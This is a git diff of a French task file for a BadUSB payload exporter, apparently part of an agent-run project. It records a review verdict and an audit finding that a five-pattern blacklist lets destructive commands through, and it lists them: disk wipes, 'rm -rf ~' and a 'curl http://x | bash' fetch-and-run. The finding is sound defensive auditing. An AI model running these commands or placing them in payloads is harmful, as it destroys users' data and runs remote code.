@@ -120,7 +120,7 @@ def export_payload_assets(payloads: list[BadUSBPayload]) -> list[AssetEntry]:
 
 Menée dans un contexte séparé, sans droit d'écriture. Critères exécutés réellement (pytest 80/80, ruff propre). Périmètre vérifié sur l'arbre, non sur un diff git.
 
-```
+```	ext
 Verdict : accepté
 Motif : tous les critères d'acceptation vérifiés par exécution — couverture OS
   (windows/macos/linux/multi), export sous /ext/badusb/{category}/{filename} +
@@ -148,11 +148,11 @@ Ajoutée après la revue indépendante ci-dessus. Le fond était « accepté ave
 
 `badusb.py:108-141` : l'exclusion des commandes destructrices repose sur `_FORBIDDEN_PATTERNS`, une liste noire de 5 motifs littéraux. Passent à `True` : `rm -rf ~`, `dd if=/dev/zero of=/dev/sda`, `curl http://x | bash`, `shutdown /s`, `powershell -enc ...`, `diskpart`, `cipher /w`. La docstring et le journal d'origine annoncent une exclusion « sans commandes destructrices » qui n'est pas tenue pour un script arbitraire.
 
-### Agent assigné
+### Agent assigné pour la correction
 
 **Opus (Claude Code).** Le choix liste noire vs liste blanche est une décision de sécurité, réservée à Opus par `AGENTS.md`. Un test écrit par l'exécutant ne rattrape pas ce qu'il n'a pas pensé à interdire — c'est le critère d'aiguillage même.
 
-### Périmètre
+### Périmètre de la correction
 
 Fichiers à créer ou modifier, et eux seuls :
 
@@ -162,7 +162,7 @@ tests/test_badusb.py
 taches/tache-12-badusb-payloads.md
 ```
 
-### Contrat
+### Contrat de la correction
 
 Trois exigences, sans élargir le périmètre :
 
@@ -177,6 +177,6 @@ Trois exigences, sans élargir le périmètre :
 - [ ] Un test documente explicitement qu'une commande destructrice en clair (p. ex. `STRING rm -rf ~`) passe la validation **syntaxique** — pour que personne ne reprenne cette fonction comme filtre de sécurité.
 - [ ] Un test vérifie que les cinq payloads par défaut sont non destructeurs (catégories sûres, revalidés avant export).
 
-### Conditions d'arrêt
+### Conditions d'arrêt de la correction
 
 - Une vraie liste blanche de contenu (au-delà de la syntaxe) est demandée : elle dépasse ce périmètre → ouvrir une fiche dédiée.
